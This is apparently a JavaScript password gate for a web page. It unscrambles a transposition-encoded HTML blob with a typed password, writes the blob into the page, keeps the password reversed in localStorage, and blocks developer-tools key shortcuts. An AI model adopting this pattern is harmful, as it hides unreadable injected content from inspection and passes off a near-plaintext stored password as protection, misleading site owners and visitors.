
function reverseString(e){let r="";for(let t=e.length-1;t>=0;t--)r+=e[t];return r}

function get_password() {

 try{ if(localStorage.getItem('session6')) {orig_pass = reverseString(localStorage.getItem('session6'))} else { orig_pass = prompt("Enter password",""); } } catch(ex){orig_pass = prompt("Enter password","");}

  

  if (orig_pass!=null && orig_pass!="")

  password = new Array(orig_pass.length);

  for(i=0; i<orig_pass.length; i++) {

    password[i] = orig_pass.charCodeAt(i);

  }

  return password;

}



password = get_password();

orig = unescape("Am%22v%22d%22%3CUXmeaIpee%20tli%20%22Omnu%3Dtl%3Dn%3Dm%3Etdom%20%20m%22apau%20chtmictfr%22c%3D%22nm/jgs%20mi%20t%22ajs%3C%3E%20lsseTuti%3Dthl%20cem%20i%3CoP-cm%3Csgt%20%20ca%3Cirm%22%22-to%20tean%3En%3Cbarmm-l%7Cyr%20too%20lD%20c%20%20r%3Eaefml%3Edn%20Crmr%20eln%3CPCmslikiil%20Lon.l%20dymee%20S%3Dpt%22/rmheml%20th%22%20scms%20e%20%20delmfm.stan%3Ese%3E%20m%3C%3D%208mdep%3E-c%20e%3DmnyocsPi%20%20tqbo%3C/l%3CttmrCm%22d%3Ch%22t%20ms%20t%22l%20etc%3AihE%3Ces%20ie/hkb%20sluut%3Camp%20%20%20eh/re2lzinadho9%215/cr%3E%2252/2mafu/ma3ei6%2008gped90a4de4dsan31a3mae1st%3Dfdb2m%20d52o%3D2a3%20%20%3D%3E74%20h%20mcet1a50%20bltd%20%20ni07%20e%3Aemapni%208meto%20oE%3Bpz7kciinehtb1mebtlmte.r%3Bsf5h%3Dotr./%20de1ehscapo%20pm5ibe/mn/ssm9te/at2ioom%20rep2haaofry9cs5m8absnx2bsa%225beutr6520%3E034h.t414e%3E7c1h.u350atid42p%22297rYbJdeneca8amei302lsd7s%3Di.%221aealahl%3Eltd8dtwsahoiea55/.%20n%20%20%20fv03/%20lms%3Ei%20%2079m%3Ent%3Ef%3CmP%203pr%20ltocco%22f%20opli.%7B%20k02%21fsemoSu%20tSgrtloeI%28t%3Ai%27m%20seidac%22euntt%20%28%29eip%20aoterlrgiz%3Ccl_mt%3Dg%27oc%3Ct.%7Bo/.tneumtnen%20%29oligioti%60muhrldn%7Dmutell%7Bp1%28e%7Bc%20Iitan5a%7Denr%20%3C%29%20r7%28c/s%20i%3Dmna5_%20%20rcasiza0cr%20%20d%20//tepaarm%3Cm%20tculh%3Espmrmij%3C%20_m%3Esmh4bemsimy.e%221tctmhr%3Eprt4%20%3Cps%3A%20zo%7D%20d%20/j%20hncmsd3pptfm%29ge%20%3E%22%22sdrllgls%20%3Cs%22ls/trted-ohpefeoe%22o%21os%7Dr8%29%60%20ml%20b%20r/4.%3F%28%3Emae%3Cfheo%24%3E");
orig = orig.split("");



passnum = orig.length % password.length;

for(i=orig.length-1; i>=0; i--) {



  passnum--;

  if (passnum == -1) passnum = password.length - 1;



  pos1 = i;

  pos2 = i + password[passnum];



  if (pos2 >= orig.length) continue;



  char1 = orig[pos1];

  char2 = orig[pos2];



  orig[pos2] = char1;

  orig[pos1] = char2;



}



orig1 = "";

for(i=0;i<orig.length;i++) {

  orig1 = orig1 + orig[i];

}

orig1 = orig1.replace(/mmm/g,"\r\n");

if(orig1.charAt(0)=='<') {try{localStorage.setItem('session6', reverseString(orig_pass))}catch(ex){}; document.write(orig1);}

else {try{localStorage.removeItem('session6')}catch(ex){}; get_password()}





window.addEventListener('keydown', function(e) {
  if(e.ctrlKey&&e.altKey&&e.which==73){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==73){event.preventDefault();}if(e.ctrlKey&&e.altKey&&e.which==74){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==74){event.preventDefault();}if(e.ctrlKey&&e.altKey&&e.which==67){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==67){event.preventDefault();}if(e.ctrlKey&&e.altKey&&e.which==85){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==85){event.preventDefault();}if(e.keyCode == 123) {return false;}})
  